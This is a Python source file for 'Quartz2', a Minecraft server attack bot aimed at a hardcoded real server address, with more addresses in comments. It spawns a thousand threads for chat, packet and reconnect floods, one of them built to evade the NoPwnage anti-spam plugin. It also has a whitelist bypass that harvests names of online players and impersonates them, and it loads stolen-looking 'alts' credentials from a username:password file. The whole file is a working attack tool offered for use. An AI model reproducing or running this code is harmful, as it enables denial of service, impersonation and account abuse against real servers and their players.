# -*- coding: utf-8 -*-
###########
# Quartz2 #
#=========#
#  v2.41  #
###########
##########################
from SyncPrint import *
import libcraftpacket, socks, time, random, threading, string, ProxyManager, sys, binascii, time
##########################

##########################
## Configuration
##########################

target = "178.33.229.220:25571" # mc.grieferszone.com" # worldcraft.us.to:25610" # ts.inforge.net" # 178.33.229.220:25571" # 46.105.108.27:25585" # 188.165.227.39:25600" # 178.33.234.88:25575" # 188.165.231.45"
threads=1000
pCount=2

#########################
# Attacks 
#########################
creativeDrop = False	# Creative drop spam!
chatFlood = True	#Spam the fuck out of the chat!
singleMessage = False	# Send a single message instead of spamming
staticFloodMessage = "" # Static Flood message. If = "", randomness :P
prependFlood = ""	#wasaple rules"# If static = "", use randomness and an optional initial message
reconnectFlood = False	# AntiSpam? No creative? Spam with left and join messages!
packetFlood = False	# A reconnect flood that tries to bypass NoPwnage's Reconnect flood check
timeout = False		# Disconnect flood on some servers
#########################
# Nick Section
#########################
nickMode = "alts"	# For Premium servers. Takes nicks and passwords from "alts.txt". They must be in username:password format
#nickMode = "random"	# Random nicks, offline mode only. You can specify the prepend variable.
#nickMode = "nicklist"	# Nick from list, offline mode only. Takes a random nick from a "nicks.txt"
#nickMode = "static"	# Predefined, single nick.
nickMode = "bypass"	# Whitelist bypass.
#########################
# Nick Advanced Config
#########################
canReconnect = False	# XAuth etc.
masterNick = "May17" # Master"	# For Whitelist bypass. MUST BE WHITELISTED!
skipNicks = ["_qwertyoruiop_", "StarTreck", "xpwn", masterNick]	# For Whitelist bypass. Will not use these nicks.
staticNick = "QtzTest" #iGameKing" # Cocche" # Jack" # zombiegoboom" # daaaniele" # BanQTZ"		# For Static nickname mode.
prepend = ""		# For nickMode = "random"
#########################

##########################
## Main Program
##########################
def parse_ip(target, default=25565):
	srv = target.replace("\n","").split(":")
	if len(srv) == 1:
	        prt = default
	else:
	        prt = int(srv[1])
	return {'ip':	srv[0],
		'port':	prt}

target = parse_ip ( target )
thhreads = list()
fl = open(target['ip'] + ".nickpool.txt", "a+", 0)

nicks = ["TheGame",]
if nickMode == "alts":
	nicks = open ("alts.txt") . readlines ()
elif nickMode == "nicklist":
	nicks = open ("nicks.txt") . readlines ()
elif nickMode == "bypass":
	fl = open(target['ip'] + ".nickpool.txt", "a+", 0)
	nicks = fl.readlines()
	syncprint("Loading whitelist bypass!")
	def event(id, object):
		if id == "\xC9":
			name = object._readStringLong().replace("\xa7\x66", "")
			isOnline = object._getBytes(1)
			ping = object._getBytes(2)
			if name in skipNicks:
				return True
			if name in nicks:
				return True
			object._log("Adding " + name)
			nicks.append(name)
			jobs.append((name.replace("\n",""), ""))
			fl.write(name+"\n")
			return True
		return False
	def eventHook():
		while True:
			x = time.time()
			libcraftpacket.CraftPlayer(masterNick, password="", proxy = None , server = (target['ip'], int(target['port'])), eventHook=event, debug=False)._connect()
			while time.time()-x <= 4:
				time.sleep(1)
			print "-> Reconnecting"
	th=threading.Thread(target = eventHook)
	th.daemon=True
	thhreads.append(th)
	th.start()
elif nickMode == "static":
	nicks = list()
	for x in xrange(1,50):
		nicks.append(staticNick)
actions = []
if creativeDrop == True:
	actions.append("creativeDrop")
if chatFlood == True:
	actions.append("chatFlood")
if reconnectFlood == True:
	actions.append("reconnectFlood")
if packetFlood == True:
	actions.append("pFlood")
if singleMessage == True:
	actions.append("sM")
if timeout == True:
	actions.append("tO")
syncprint ( "######################" )
syncprint ( "# Welcome to Quartz2 #" )
syncprint ( "# For  Minecraft 1.2 #" )
syncprint ( "#     2.0.0.1-git    #" )
syncprint ( "######################" )
syncprint ( "" )
jobs = list()
lk = threading.Lock()
def cbck(x,y):
	try:
		jobs.remove((y._nickname,y._password))
	except:
		pass
	print "callback"
def ThreadEntry():
	with lk:
		pass
	while True:
		try:
			if nickMode == "random":
				job=(prepend+"".join(random.choice(string.letters+string.digits) for x in range(random.randint(6-len(prepend),15-len(prepend)))),"")
			else:
				with lk:
					job = jobs.pop(0)
					jobs.append(job)
			nickname,password = job
			libcraftpacket.CraftPlayer(nickname, password=password, proxy = "" , server = (target['ip'], int(target['port'])), attacks=actions, prependFlood=prependFlood, msg=staticFloodMessage, debug=False, printchat=False, count=pCount,callback=cbck)._connect()
		except:
			pass
for nickname in nicks:
	password = ""
	if nickMode == "alts":
		nickname, password = nickname.replace("\n","").split(":")
	jobs.append((nickname.replace("\n",""), password))
print "Loading threads.."
with lk:
	for x in xrange(threads):
		th=threading.Thread(target = ThreadEntry)
		th.daemon=True
		thhreads.append(th)
		th.start()
print "Running!"
try:
	while True: time.sleep(1000)
except (KeyboardInterrupt, SystemExit):
	synckill( '\nReceived keyboard interrupt, quitting!' )
